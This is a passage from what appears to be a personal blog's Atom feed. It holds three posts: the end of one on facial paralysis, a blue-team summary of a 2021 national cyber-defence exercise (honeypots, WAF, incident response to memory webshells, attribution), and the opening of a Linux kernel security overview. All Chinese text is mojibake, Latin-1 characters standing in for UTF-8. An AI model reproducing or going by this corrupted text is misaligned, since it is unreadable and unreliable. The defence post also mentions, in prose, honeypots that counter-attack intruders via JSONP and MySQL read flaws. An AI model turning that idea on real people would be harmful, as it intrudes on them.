è¿™æ€ä¹ˆæ‹–åˆ°ç°åœ¨å‘€ï¼Œåº”è¯¥æ—©ç‚¹æ¥çœ‹ç—…å‘€ï¼Œå°±ç®—å¤§æ¦‚ç‡ä¼šå¥½ä¹Ÿä¸è¦è¿™ä¹ˆè‡ªä¿¡å‘€ï¼Œè¿™ä¹ˆå¸…çš„å°ä¼™å­è„¸æ­ªäº†ä»¥åæ€ä¹ˆæ‰¾è€å©†å‘€â€ï¼ˆæˆ‘ï¼šï¼Ÿï¼Ÿï¼Ÿï¼‰æœ€åä¸‰ä¸‹äº”é™¤äºŒï¼Œæ£€æŸ¥äº†é¢éƒ¨ç¥ç»æƒ…å†µï¼Œä¹Ÿåªå¾—å‡ºå³è¾¹é¢éƒ¨ç¥ç»å—æŸï¼Œå—æŸåŸå› ä¸€ç›´æ˜¯ä¸ªè¿·ï¼Œå¼€äº†ä¸€å…±400å¤šçš„è¯ï¼Œè¿˜æœ‰ä¸¤å‘¨çš„æ‰“é’ˆæ³¨å°„è¯ï¼Œæ‚ä¸ƒæ‚å…«åŠ åœ¨ä¸€èµ·èŠ±äº†ä¸€åƒå‡ºå¤´ï¼Œæœ¬æ¥æ˜¯å¯ä»¥æŠ¥é”€çš„ï¼Œå½“æ—¶ç€æ€¥æ²¡æ³¨æ„è‡ªè´¹å…¬è´¹çš„é—®é¢˜ï¼Œäºåˆ°å§¥å§¥å®¶ã€‚ã€‚ã€‚ã€‚ç¬¬äºŒæ¬¡çœ‹åŒ»ç”ŸåŒæ ·å°±è¿™æ ·ç»“æŸäº†ã€‚</p><h2 id="ç»™ç”Ÿæ´»å¸¦æ¥çš„å½±å“"><a href="#ç»™ç”Ÿæ´»å¸¦æ¥çš„å½±å“" class="headerlink" title="ç»™ç”Ÿæ´»å¸¦æ¥çš„å½±å“"></a>ç»™ç”Ÿæ´»å¸¦æ¥çš„å½±å“</h2><p>å¤§æ¦‚ä»¥ä¸‹å››ç‚¹å½±å“å¾ˆå¤§ï¼š</p><ul><li>è¯´è¯ï¼ˆå˜´æœ‰ä¸€è¾¹å¼ ä¸å¼€ï¼Œè¯´è¯å¾ˆè´¹åŠ²ï¼‰</li><li>åƒé¥­ï¼ˆåŒæ ·çš„ç†ç”±ï¼Œåƒé¥­å…¨é å·¦è¾¹å¸¦é£ï¼‰</li><li>å–æ°´å±æ¼±å£ï¼ˆå› ä¸ºæœ‰åŠè¾¹ç¥ç»å—æŸï¼ŒæŠŠæ°´åŒ…ä½å¾ˆè´¹åŠ›ï¼Œæ—¶å¸¸ä¼šæ¼æ°´ï¼Œç”»é¢å¤ªç¾ä¸æ•¢æƒ³ï¼‰</li><li>çœ¼ç›å®¹æ˜“å¹²ï¼ˆå› ä¸ºè¿˜è¦ç»å¸¸çœ‹ç”µè„‘ï¼Œå³è¾¹ç¥ç»é—®é¢˜å¯¼è‡´çœ¼çš®è¿ä½œå¹…åº¦ä¹Ÿå˜å°ï¼‰</li></ul><p>è¯´è¯æˆ‘éƒ½æ˜¯ç”¨æ‰‹æ‹–ç€å³è¾¹è¯´ï¼ˆéš¾é¡¶ã€‚ã€‚ï¼‰ï¼Œåƒé¥­å°±åªèƒ½é ä¸€è¾¹è¾“å‡ºï¼Œæ¼±å£æ²¡åŠæ³•å¼„ç›´æ¥å·¦å³æ™ƒè„‘è¢‹ä»£æ›¿å˜´éƒ¨è¿åŠ¨ï¼Œçœ¼ç›å®¹æ˜“å¹²å°±æ»´çœ¼è¯æ°´ã€‚å…¶ä»–æ–¹é¢éƒ½é—®é¢˜ä¸å¤§ï¼Œç”Ÿæ´»ç…§å¸¸ç»§ç»­ã€‚</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>è‡³ä»Šä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šå±€éƒ¨æ€§é¢ç˜«ï¼Œçœ‹äº†ä¸¤æ¬¡åŒ»ç”Ÿéƒ½è¯´æ˜¯å¤§æ¦‚ç‡ç€å‡‰å¹é£ï¼Œä½†é‚£å‡ å¤©ä¹Ÿæ²¡æœ‰å‘çƒ§ï¼Œä¹Ÿæ²¡æœ‰æ„Ÿå†’ï¼Œè¦è¯´å¹é£åŒ—äº¬é£è¿™ä¹ˆå¤§æˆ‘åŸºæœ¬ä¸Šå¤©å¤©è¢«å¹ï¼Œè¿™å°±æ˜¾å¾—ç‰¹åˆ«è¯¡å¼‚ã€‚æˆ‘çš„æ¨æµ‹æ˜¯å› ä¸ºå³çœ¼çš®ç‹‚è·³å¯¼è‡´çš„ç—…ç—‡ï¼Œä¸»è¦è·³çš„æ—¶é—´æœ‰ç‚¹é•¿çš„ç¦»è°±äº†ï¼Œè®©äººä¸å¾—ä¸æ€€ç–‘ã€‚ï¼ˆä¹Ÿä¸å¾—ä¸åæ§½ï¼Œå›½å†…çš„æŸäº›åŒ»é™¢çœŸçš„æ°´ã€‚ã€‚ã€‚æƒ…å†µæ²¡é—®å‡ å¥ï¼Œæ€¥åŒ†åŒ†å¼€å®Œè¯å°±è®©æˆ‘èµ°äº†ï¼‰è¿˜æœ‰èº«ä½“æ‰æ˜¯æœ€é‡è¦çš„ï¼Œåšä¸é‚£ä¹ˆç´§æ€¥çš„é¡¹ç›®å°±åº”è¯¥æºœå»ä¼‘æ¯ä¸€ä¸‹ 55555</p><p>å¦å¤–ä¸€ç‚¹æ˜¯æˆ‘ç¬¬äºŒæ¬¡çœ‹åŒ»ç”Ÿç›´æ¥æ‹–äº†ä¸€å‘¨æ‰å»çš„ï¼Œç°åœ¨çœ‹æ¥è¿˜æ˜¯åº”è¯¥å°½æ—©å»å¤§åŒ»é™¢å†æ¬¡æ£€æŸ¥ï¼ŒåŠæ—¶åƒè¯æ‰“é’ˆæ›´æœ‰åˆ©äºå¿«é€Ÿæ¢å¤ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è¿™ä¸ªæ ‡é¢˜çœ‹èµ·æ¥ç¡®å®æœ‰ç‚¹æƒŠæ‚šï¼Œä½†å®é™…ä¸Šä¹Ÿåªæ˜¯å¾—äº†ä¸€ä¸ªæœ‰ç‚¹ç‰¹æ®Šçš„ç—…ã€‚å¥½åœ¨å·²ç»æ¢å¤çš„å·®ä¸å¤šäº†ï¼Œè®°å½•ä¸€ä¸‹å‘ç”Ÿè¿‡åå¦‚ä½•å¤„ç†ï¼Œåº”å¯¹ä»¥åŠä¼šç»™ç”Ÿæ´»å¸¦æ¥ä»€ä¹ˆæ ·çš„å½±å“ã€‚&lt;/p&gt;
&lt;h2 id=&quot;äº‹å‘ä¹‹å‰çš„å¾å…†ï¼Ÿ&quot;&gt;&lt;a href=&quot;#äº‹å‘ä¹‹å‰çš„å¾å…†ï¼Ÿ&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
      <category term="æ‚è°ˆ" scheme="https://hurricane618.me/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="é—²èŠ" scheme="https://hurricane618.me/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>hw2021 è“é˜Ÿæ€»ç»“</title>
    <link href="https://hurricane618.me/2021/05/15/hw2021-summary/"/>
    <id>https://hurricane618.me/2021/05/15/hw2021-summary/</id>
    <published>2021-05-15T07:12:55.000Z</published>
    <updated>2021-05-15T07:12:55.052Z</updated>
    
    <content type="html"><![CDATA[<p>æ‹–äº†å¥½ä¹…ï¼Œç»ˆäºè¶ç€ä¼‘æ¯çš„æ—¶å€™ç®€å•æ€»ç»“ä¸€ä¸‹ç¬¬ä¸€æ¬¡hwå­¦ä¹ åˆ°çš„ä¸œè¥¿ã€‚ï¼ˆåº”è¯¥ä¹Ÿæ˜¯æœ€åä¸€æ¬¡ï¼‰</p><h2 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h2><h3 id="èµ„äº§æ¢³ç†ä¸æ’æŸ¥"><a href="#èµ„äº§æ¢³ç†ä¸æ’æŸ¥" class="headerlink" title="èµ„äº§æ¢³ç†ä¸æ’æŸ¥"></a>èµ„äº§æ¢³ç†ä¸æ’æŸ¥</h3><p>åœ¨hwå‰æœŸï¼Œéœ€è¦æ¢³ç†é˜²æŠ¤å•ä½çš„èµ„äº§ï¼Œæ¯”å¦‚å“ªäº›æœåŠ¡å™¨æ˜¯ç”¨æ¥åšä»€ä¹ˆçš„ï¼Œç½‘ç»œæ‹“æ‰‘ç»“æ„ï¼Œæœ‰å“ªäº›é˜²æŠ¤è®¾å¤‡ï¼Œé˜²æŠ¤è®¾å¤‡éƒ½å¼€å¯äº†å“ªäº›è®¾ç½®ã€‚å¯¹äºä¸é‡è¦çš„æœåŠ¡å’Œä¸šåŠ¡åº”è¯¥å°½å¯èƒ½çš„å…³é—­ï¼Œå‡å°‘æ”»å‡»è€…èƒ½åˆ©ç”¨çš„æ”»å‡»é¢ã€‚åŒæ—¶æ’æŸ¥ç°æœ‰æœåŠ¡å™¨ä¸­æ˜¯å¦å­˜åœ¨æ¼æ´å’Œè¿‡å»é—ç•™ä¸‹çš„åé—¨æœ¨é©¬ã€‚</p><h3 id="é˜²æŠ¤è®¾å¤‡é…ç½®"><a href="#é˜²æŠ¤è®¾å¤‡é…ç½®" class="headerlink" title="é˜²æŠ¤è®¾å¤‡é…ç½®"></a>é˜²æŠ¤è®¾å¤‡é…ç½®</h3><p>åœ¨å®Œæˆèµ„äº§çš„æ¢³ç†å’Œæ’æŸ¥ä¹‹åï¼Œéœ€è¦å¯¹ç›¸å…³çš„ä¸šåŠ¡åšé˜²å¾¡åŠ å¼ºï¼Œé…ç½®ç›¸å…³çš„WAFå’Œé˜²ç«å¢™è¿‡æ»¤æ”»å‡»æµé‡ã€‚ç„¶åé…ç½®æ¢é’ˆè·å–å¤–ç½‘åˆ°å†…ç½‘ä»¥åŠå†…ç½‘ä¹‹é—´çš„æµé‡æ•°æ®ï¼Œè¿™äº›æµé‡æ•°æ®æ­é…ä¸€äº›æ—¥å¿—åˆ†æå¹³å°ï¼Œç›‘æ§ç½‘ç»œæ”»å‡»çš„å®æ—¶æƒ…å†µï¼ŒåŒæ—¶æµé‡æ•°æ®ä¹Ÿèƒ½ä¸ºä¹‹åçš„æº¯æºæä¾›å¸®åŠ©ã€‚åœ¨ç›¸å…³ä¸šåŠ¡çš„é‡è¦æœåŠ¡å™¨ä¸Šéƒ¨ç½²ä¸»æœºé˜²å¾¡ç³»ç»Ÿï¼Œè®°å½•æœåŠ¡å™¨ä¸Šçš„æ‰§è¡Œç¨‹åºæ—¥å¿—ï¼Œä¹Ÿèƒ½é…ç½®ç­–ç•¥ç¦æ­¢ä¸€äº›é«˜å±æ“ä½œå’Œæƒé™æ§åˆ¶ã€‚éƒ¨ç½²ä¸ä¸»è¦ä¸šåŠ¡ç±»ä¼¼çš„èœœç½ç³»ç»Ÿï¼Œæœ€å¥½æ˜¯é‡‡ç”¨ä¸€æ¯”ä¸€å®Œå…¨ç›¸ä¼¼çš„ä¸šåŠ¡æœåŠ¡ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆæ¶ˆè€—æ”»å‡»è€…çš„æ—¶é—´ï¼Œè¿˜èƒ½è§‚å¯Ÿåˆ°æ”»å‡»è€…çš„æ”»å‡»ç—•è¿¹å’Œæ”»å‡»IPï¼Œä¸ºåç»­çš„ååˆ¶æä¾›ä¿¡æ¯ï¼Œè¿™é‡Œçš„èœœç½è¿˜èƒ½é‡‡ç”¨ä¸€äº›æ¶æ„æœåŠ¡ç¨‹åºåå‘æ”»å‡»è·å–æ”»å‡»è€…çš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚jsonpè·å¾—ç¤¾äº¤è´¦å·ï¼Œmysqlæ•°æ®åº“è¯»æ¼æ´ã€‚</p><h3 id="é˜²æŠ¤äººå‘˜åˆ†ç»„"><a href="#é˜²æŠ¤äººå‘˜åˆ†ç»„" class="headerlink" title="é˜²æŠ¤äººå‘˜åˆ†ç»„"></a>é˜²æŠ¤äººå‘˜åˆ†ç»„</h3><p>å¯¹æ¥ä¸‹æ¥hwä¸­çš„é˜²æŠ¤äººå‘˜è¿›è¡Œåˆ†ç»„ï¼Œå¤§å®¶ç›¸äº’åä½œé…åˆï¼Œæˆ‘åœ¨çš„åœ°æ–¹æ˜¯ï¼š</p><p>èœœç½ï¼ˆ1ï¼‰+ æµé‡æ¢é’ˆï¼ˆ1ï¼‰+ æµé‡åˆ†æï¼ˆ1ï¼‰+ å¤„ç½®å°é”IPå’Œå¢åŠ è§„åˆ™ï¼ˆ1ï¼‰+ ä¸»æœºé˜²æŠ¤å’Œwafï¼ˆ2ï¼‰+ ç ”åˆ¤åˆ†æï¼ˆ3ï¼‰+ ä¸šåŠ¡æ–¹ï¼ˆ3ï¼‰+ æ€»æŒ‡æŒ¥ï¼ˆ2ï¼‰</p><p>å…¶ä¸­èœœç½ï¼Œæµé‡æ¢é’ˆï¼Œæµé‡åˆ†æï¼Œä¸»æœºé˜²æŠ¤ï¼ŒwafåŸºæœ¬ä¸Šéƒ½æ˜¯åœ¨å„è‡ªå®¡æŸ¥ç³»ç»Ÿä¸Šçš„æ—¥å¿—å’Œæ•°æ®ï¼Œå¦‚æœæœ‰å¼‚å¸¸ä¼šä¸ŠæŠ¥ç»™ç ”åˆ¤ç»„ï¼Œç ”åˆ¤ç»„åˆ†æç ”åˆ¤ä¹‹åç¡®å®šä¸ºçœŸå®æ”»å‡»ä¼šå†™ä¸€ä»½ç›¸å…³çš„ç®€æŠ¥ï¼Œå¦‚æœæ˜¯é‡å¤§äº‹ä»¶ç ”åˆ¤ç»„åˆ™ä¼šååŒå„ä¸ªå°ç»„äººå‘˜è¿›è¡Œæº¯æºåˆ†æã€‚ä¸šåŠ¡æ–¹æ˜¯æ¯ä¸ªä¸šåŠ¡æ’çš„ä¸€ä¸ªäººç¡®ä¿ç³»ç»Ÿæ­£å¸¸è¿è¡Œï¼Œä»¥åŠé…åˆä¿®è¡¥ç³»ç»Ÿæ¼æ´ã€‚æ€»æŒ‡æŒ¥ä¼šåè°ƒå„ä¸ªå°ç»„çš„é…åˆï¼Œæ•´ç†æ±‡æ€»åˆ†ææŠ¥å‘Šï¼Œå¯¹hwæ•´ä½“å±€åŠ¿åšæŠŠæ§ã€‚</p><h2 id="æ¼”æˆè¿›è¡Œä¸­"><a href="#æ¼”æˆè¿›è¡Œä¸­" class="headerlink" title="æ¼”æˆè¿›è¡Œä¸­"></a>æ¼”æˆè¿›è¡Œä¸­</h2><h3 id="å¨èƒç›‘æ§"><a href="#å¨èƒç›‘æ§" class="headerlink" title="å¨èƒç›‘æ§"></a>å¨èƒç›‘æ§</h3><p>åœ¨hwå¼€å§‹ä¹‹åï¼Œå¤„åœ¨å„ä¸ªå®¡æŸ¥ç³»ç»Ÿä¸Šçš„äººå‘˜ä¸“æ³¨æŸ¥çœ‹è¿™äº›æ—¥å¿—è®°å½•ï¼Œå¯¹å…¶ä¸­é«˜å±çš„æ“ä½œå’Œå¼‚å¸¸æ—¥å¿—è¿›è¡Œä¸ŠæŠ¥ï¼Œæ¯”å¦‚ä¼šæœ‰ä¸€äº›æ¶æ„é€šä¿¡ï¼Œéœ€è¦åˆ¤æ–­æ˜¯å¦æ˜¯è¯¯æŠ¥ï¼Œå¦‚æœä¸æ˜¯è¯¯æŠ¥åˆ™éœ€è¦è¿½è¸ªè¿™ä¸ªæ”»å‡»æ˜¯å¦æˆåŠŸï¼Œæ˜¯å¦é€ æˆå½±å“ï¼Œæœ€åç¡®å®šèƒ½é€ æˆå½±å“ï¼Œä½†æœåŠ¡å™¨ä¸åœ¨æˆ‘ä»¬è¿™é‡Œï¼Œæ˜¯æŸä¸ªæˆå‘˜å•ä½æ‹¥æœ‰çš„ï¼Œåˆ™ä¹¦å†™ä¸€ä»½ç®€æŠ¥ä¸Šäº¤ç»™æ€»æŒ‡æŒ¥ï¼Œå¦‚æœæ˜¯æˆ‘ä»¬è¿™é‡Œçš„ä¸»è¦ä¸šåŠ¡ç³»ç»Ÿå—åˆ°å½±å“ï¼Œåˆ™éœ€è¦è¿›ä¸€æ­¥æº¯æºæ’æŸ¥æ”»å‡»æƒ…å†µã€‚å®¡æŸ¥ç³»ç»Ÿä¸Šçš„äººå‘˜åœ¨çœ‹åˆ°å¤§é‡æ‰«ææ”»å‡»è¡Œä¸ºæ—¶ä¼šä¸ŠæŠ¥æ”»å‡»è€…çš„IPç»™è´Ÿè´£å¤„ç½®çš„åŒäº‹ï¼Œæ·»åŠ å°é”çš„IPåœ°å€ï¼Œæ¶ˆè€—æ”»å‡»é˜Ÿçš„IPæ± ã€‚æ”¶é›†åˆ°æœ‰æ–°æ¼æ´çš„å¨èƒæƒ…æŠ¥ä¹‹åä¼šè¿›è¡ŒéªŒè¯ï¼Œè¯¥æ‰“è¡¥ä¸çš„æ‰“è¡¥ä¸ï¼Œæ²¡è¡¥ä¸çš„è¿›è¡Œä¸´æ—¶è¿‡æ»¤ä¿®è¡¥ã€‚</p><h3 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h3><p>åœ¨åˆ¤æ–­åˆ°æˆ‘ä»¬çš„ä¸»è¦ä¸šåŠ¡æ”¶åˆ°å½±å“ä¹‹åï¼Œå¼€å§‹åº”æ€¥å“åº”çš„æµç¨‹ï¼Œåœ¨è¢«æ”»å‡»çš„ä¸»æœºä¸Šæ”¶é›†ä¿¡æ¯ï¼ŒåŒ…æ‹¬historyä¿¡æ¯ï¼Œwebæ—¥å¿—ä¿¡æ¯ï¼Œç»“åˆæ”»å‡»æµé‡ï¼Œä¸»æœºé˜²æŠ¤ç³»ç»Ÿçš„è®°å½•ï¼Œå¯¹æ”»å‡»è€…çš„å…¥ä¾µè·¯å¾„å’Œé—ç•™ä¸‹çš„æœ¨é©¬åé—¨åšåˆ¤æ–­ã€‚é’ˆå¯¹é—ç•™çš„æœ¨é©¬åé—¨ï¼Œä¿å­˜å‰¯æœ¬å¹¶åˆ é™¤æœåŠ¡å™¨ä¸Šçš„æ¶æ„ä»£ç ï¼Œè¿™ä¸€æ¬¡hwä¸­å‡ºç°äº†å¤§é‡çš„å†…å­˜æœ¨é©¬ï¼Œä½¿å¾—éš¾ä»¥è¢«å‘ç°ï¼Œè™½ç„¶æœ€åé€šè¿‡æµé‡åˆ†æå’Œwebæ—¥å¿—æ‰¾åˆ°äº†å…¥ä¾µç—•è¿¹ï¼Œæˆ‘ä»¬è¿˜æ˜¯åªèƒ½ç”¨é‡å¯æœåŠ¡çš„ä»£ä»·æ¶ˆç­å®ƒã€‚åœ¨æ’é™¤äº†å¨èƒä¹‹åï¼Œæˆ‘ä»¬å¼€å§‹è¿›ä¸€æ­¥å¯¹æ”»å‡»è€…çš„å…¥ä¾µè·¯å¾„åšè°ƒæŸ¥ï¼Œæœ€åç¡®å®šæ˜¯åˆ©ç”¨äº†æœ€æ—©çš„OAæ¼æ´ï¼Œåœ¨æ²¡æœ‰åŠæ—¶æ‰“ä¸Šè¡¥ä¸çš„æ—¶å€™å·å·æ‘¸è¿›æ¥çš„ï¼Œä¸ä»…å¦‚æ­¤ï¼Œæ ¹æ®å†…å­˜é©¬ä¸­çš„IDä¿¡æ¯å¯ä»¥ç¡®å®šåˆ°æ”»å‡»è€…çš„ä¸ªäººä¿¡æ¯ï¼Œå®Œæˆäº†æº¯æºåˆ°æœ¬äººçš„å·¥ä½œã€‚åœ¨ä¸»æœºé˜²æŠ¤ç³»ç»Ÿä¸Šä¹Ÿçœ‹åˆ°äº†æ”»å‡»è€…åœ¨å‡Œæ™¨æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ›´åŠ æ¸…æ™°çš„çœ‹åˆ°æ”»å‡»è€…çš„åŠ¨ä½œï¼Œæ¯”è¾ƒæœ‰è¶£çš„ä¸€ç‚¹æ˜¯æˆ‘ä»¬æ˜¯å‘ç°ä¸»æœºé˜²å¾¡ç³»ç»Ÿçš„æœåŠ¡è¢«å¸è½½æ‰æ„è¯†åˆ°é—®é¢˜çš„ä¸¥é‡æ€§ï¼Œ23333ã€‚</p><p>å¦å¤–ä¸€æ¬¡åº”æ€¥å“åº”ï¼Œå·²ç»ä¸èƒ½å«åšåº”æ€¥å“åº”äº†ã€‚ã€‚ã€‚åªèƒ½å«åšäº‹åæº¯æºæ’æŸ¥ï¼Œæ¥åˆ°æŸä¸ªæˆå‘˜å•ä½è¢«æ—¥ç©¿çš„æ¶ˆæ¯ï¼ŒåŒ†åŒ†å¿™å¿™èµ¶å»æ’æŸ¥ã€‚åˆ°é‚£è¾¹ä¹‹åå‘ç°æ˜¯windows server 2008ï¼Œåªèƒ½è¯´ç‰›é€¼ï¼Œç°åœ¨è¿˜æœ‰äººç”¨windowsçš„æœåŠ¡å™¨ã€‚æ”¶é›†åˆ°äº†ä¸€æ³¢ç³»ç»Ÿæ—¥å¿—ä¿¡æ¯ï¼Œwebæ—¥å¿—ä¿¡æ¯ä¹‹åï¼Œç°æºœæºœçš„èµ°äº†ï¼Œæ²¡æœ‰ä»€ä¹ˆå¤ªå¥½çš„å‘ç°ï¼Œè€Œä¸”å¾ˆå¤šæ”»å‡»è€…ç•™ä¸‹çš„ç—•è¿¹éƒ½è¢«å¾ˆè ¢çš„è¿ç»´ç»™åˆ äº†ï¼Œåªèƒ½è¯´è¿™ç§äº‹ä¸šå•ä½çš„é˜²æŠ¤æªæ–½çœŸçš„å¾ˆåƒåœ¾ã€‚æœ€åæ ¹æ®å„ç§æ—¥å¿—ä¿¡æ¯å‘ç°åœ¨æœ€æ—©çš„ä¸€å¤©æ”»å‡»è€…å°±è¿›æ¥äº†ï¼Œä½†æ˜¯æ”»å‡»çš„è·¯å¾„å®Œå…¨æ— æ³•ç¡®å®šã€‚ã€‚ã€‚ã€‚ä¿¡æ¯å¤ªå°‘ç„¶åå°±ä¸äº†äº†ä¹‹ã€‚</p><h3 id="æ¯æ—¥æ€»ç»“"><a href="#æ¯æ—¥æ€»ç»“" class="headerlink" title="æ¯æ—¥æ€»ç»“"></a>æ¯æ—¥æ€»ç»“</h3><p>æ¯å¤©ä»æ—©ä¸Š8ç‚¹åŠå¼€å§‹åˆ°æ™šä¸Š9ç‚¹ç»“æŸï¼Œæ—©ä¸Šåˆšåˆ°çš„æ—¶å€™ä¼šæ£€æŸ¥æ™šä¸Šçš„æ—¥å¿—æƒ…å†µï¼Œåœ¨æ™šä¸Šç»“æŸçš„æ—¶å€™ä¼šå¼€ä¸€ä¸ªç®€çŸ­çš„å°ä¼šï¼Œå¤§å®¶æ±‡æŠ¥ä»Šå¤©å„ä¸ªå²—ä½çš„æƒ…å†µï¼Œæœ€åæ€»æŒ‡æŒ¥ä¼šå¯¹ä»Šå¤©çš„æƒ…å†µåšæ€»ç»“ï¼Œè¿™ä¼šå„¿æœ‰å¯èƒ½ç”²æ–¹çˆ¸çˆ¸ä¹Ÿä¼šæ¥ä¸¤å¥ã€‚</p><h2 id="ä¼šåæ€»ç»“"><a href="#ä¼šåæ€»ç»“" class="headerlink" title="ä¼šåæ€»ç»“"></a>ä¼šåæ€»ç»“</h2><h3 id="æ±‡æŠ¥æ¼”ä¹ æƒ…å†µ"><a href="#æ±‡æŠ¥æ¼”ä¹ æƒ…å†µ" class="headerlink" title="æ±‡æŠ¥æ¼”ä¹ æƒ…å†µ"></a>æ±‡æŠ¥æ¼”ä¹ æƒ…å†µ</h3><p>åœ¨hwç»“æŸåçš„ä¸€å¤©ä¸‹åˆå¼€äº†æ€»ç»“å¤§ä¼šï¼Œä¸»è¦æ˜¯äº¤ä»£äº†hwæœŸé—´åšçš„å·¥ä½œï¼Œå°é”çš„IPï¼Œæº¯æºçš„ç»“æœï¼Œæäº¤çš„æŠ¥å‘Šï¼Œå„å®¶æä¾›æœåŠ¡çš„å•ä½åšçš„è´¡çŒ®å¦‚ä½•ã€‚æŒ‡å‡ºè¿™æ¬¡hwä¸­åšçš„ä¸è¶³ï¼Œè¿˜éœ€è¦æ”¹è¿›çš„åœ°æ–¹ï¼Œä»¥åŠç³»ç»Ÿä¸­å“ªäº›æ˜¯è„†å¼±ç‚¹ï¼Œå“ªäº›è¿˜éœ€è¦åŠ å¼ºã€‚ä¸å¾—ä¸è¯´OAçœŸçš„æ˜¯é‡ç¾åŒºï¼Œæ¯å¹´éƒ½æ˜¯è¢«æ‰“çš„å¾ˆæƒ¨ã€‚</p><h3 id="åç»­å·¥ä½œäº¤æ¥"><a href="#åç»­å·¥ä½œäº¤æ¥" class="headerlink" title="åç»­å·¥ä½œäº¤æ¥"></a>åç»­å·¥ä½œäº¤æ¥</h3><p>æ¯ä¸ªäººéœ€è¦æäº¤ä¸€ä»½hwçš„æ€»ç»“æŠ¥å‘Šï¼Œæè¿°è‡ªå·±çš„å·¥ä½œæƒ…å†µï¼ˆä¹Ÿæ˜¯ç»™ç”²æ–¹çˆ¸çˆ¸äº¤å·®ï¼Œä¸ç„¶æ˜¾å¾—è‡ªå·±å¾ˆæ‘¸é±¼ï¼Œ23333ï¼‰ï¼Œå¯¹å·¥ä½œä¸­é—ç•™çš„é—®é¢˜äº¤æ¥ç»™å…¶ä»–äººæ¥å®Œæˆå‰©ä¸‹çš„å·¥ä½œã€‚æ¯”å¦‚ï¼šä¸ºäº†ä¸´æ—¶é˜²å¾¡ä¸€äº›æ”»å‡»åšäº†å“ªäº›ç­–ç•¥è°ƒæ•´ï¼Œéœ€ä¸éœ€è¦æ›¿æ¢å›æ¥ç­‰ç­‰ã€‚</p><h2 id="æœ€åç”¨ä¸€å¼ å›¾æè¿°hwçš„çœŸå®æ„Ÿå—"><a href="#æœ€åç”¨ä¸€å¼ å›¾æè¿°hwçš„çœŸå®æ„Ÿå—" class="headerlink" title="æœ€åç”¨ä¸€å¼ å›¾æè¿°hwçš„çœŸå®æ„Ÿå—"></a>æœ€åç”¨ä¸€å¼ å›¾æè¿°hwçš„çœŸå®æ„Ÿå—</h2><img src="/2021/05/15/hw2021-summary/1.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ‹–äº†å¥½ä¹…ï¼Œç»ˆäºè¶ç€ä¼‘æ¯çš„æ—¶å€™ç®€å•æ€»ç»“ä¸€ä¸‹ç¬¬ä¸€æ¬¡hwå­¦ä¹ åˆ°çš„ä¸œè¥¿ã€‚ï¼ˆåº”è¯¥ä¹Ÿæ˜¯æœ€åä¸€æ¬¡ï¼‰&lt;/p&gt;
&lt;h2 id=&quot;å‰æœŸå‡†å¤‡&quot;&gt;&lt;a href=&quot;#å‰æœŸå‡†å¤‡&quot; class=&quot;headerlink&quot; title=&quot;å‰æœŸå‡†å¤‡&quot;&gt;&lt;/a&gt;å‰æœŸå‡†å¤‡&lt;/h2&gt;&lt;h3 id=&quot;èµ„äº§æ¢³ç†ä¸æ’æŸ¥
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="hw" scheme="https://hurricane618.me/tags/hw/"/>
    
      <category term="æ€»ç»“" scheme="https://hurricane618.me/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>Linux å†…æ ¸å®‰å…¨æœºåˆ¶æ€»ç»“</title>
    <link href="https://hurricane618.me/2021/04/28/linux-kernel-security-summary/"/>
    <id>https://hurricane618.me/2021/04/28/linux-kernel-security-summary/</id>
    <published>2021-04-28T02:32:46.000Z</published>
    <updated>2021-04-28T02:32:46.525Z</updated>
    
    <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘äºå®‰å…¨å®¢  <a href="https://www.anquanke.com/post/id/238363" target="_blank" rel="noopener">https://www.anquanke.com/post/id/238363</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰é¢è¯•è¢«é—®åˆ°äº†å†…æ ¸å®‰å…¨æœºåˆ¶çš„ç›¸å…³é—®é¢˜ï¼Œä½†æ˜¯æ²¡æœ‰å¾ˆå¥½çš„å›ç­”å‡ºæ¥ï¼Œæ‰€ä»¥åœ¨æ­¤ä»¥å­¦ä¹ çš„ç›®çš„æ€»ç»“è¿™æ–¹é¢çš„çŸ¥è¯†ã€‚æ¬¢è¿å„ä½å¸ˆå‚…ä¸€èµ·äº¤æµè®¨è®ºã€‚</p><h2 id="é˜²å¾¡æ¡†æ¶"><a href="#é˜²å¾¡æ¡†æ¶" class="headerlink" title="é˜²å¾¡æ¡†æ¶"></a>é˜²å¾¡æ¡†æ¶</h2><p>è¯´åˆ°Linuxå†…æ ¸é˜²å¾¡å°±ä¸å¾—ä¸æèµ·é‚£å¼ å¹¿æ³›æµä¼ çš„<code>Linux Kernel Defence Map</code>ã€‚è¿™é‡Œæ”¾å‡ºä¸¤ä¸ªä¸åŒç‰ˆæœ¬çš„å¯¹æ¯”å›¾ï¼Œå¯ä»¥çœ‹åˆ°æ–°ç‰ˆæœ¬ä¸­åˆå¯¹è€ç‰ˆæœ¬çš„åœ°å›¾åšäº†ä¸€äº›ä¿®æ”¹å’Œæ·»åŠ ã€‚æ–°å›¾åœ¨è€å›¾çš„åŸºç¡€ä¸Šä¿®æ”¹äº†ä¸€äº›è¯­è¨€æè¿°ï¼Œå¹¶ä¸”è°ƒæ•´äº†æ’åˆ—é¡ºåºï¼Œå¢åŠ 